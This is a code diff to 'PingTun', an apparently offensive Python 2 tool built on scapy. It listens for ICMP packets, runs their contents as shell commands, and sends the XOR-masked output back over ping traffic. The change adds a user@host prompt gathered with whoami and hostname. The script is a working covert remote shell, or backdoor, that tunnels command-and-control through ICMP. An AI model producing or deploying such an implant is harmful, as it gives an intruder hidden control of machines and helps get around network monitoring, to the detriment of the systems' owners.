@@ -1,10 +1,24 @@
 from scapy.all import *
-import sys, time
+import sys, time, platform
 
 if len(sys.argv) != 2:
         print "[PingTun] Usage: python2 client.py <interface>"
         print "[PingTun] Exiting..."
         exit()
+
+prompt = ""
+
+if platform.system() == "Windows":
+	prompt = "C:\\"
+else:
+	proc = subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE,    
+	stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+	user = proc.stdout.read() + proc.stderr.read()
+
+	proc = subprocess.Popen("hostname", shell=True, stdout=subprocess.PIPE,
+	stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+	host = proc.stdout.read() + proc.stderr.read()
+	prompt = ("[" + user + "@" + host + "]").replace("\n", '') 
 
 xor = "\x42\x42\x42\x42"
 
@@ -42,9 +56,7 @@ def XOR(p):
 def command_shell(data):
 	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
 	stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-	
 	value = proc.stdout.read() + proc.stderr.read()
-
-	sendp(packet_builder(shell + value),verbose=0)
+	sendp(packet_builder(shell + value + prompt),verbose=0)
 
 sniff(iface=sys.argv[1],filter="icmp",prn=action)
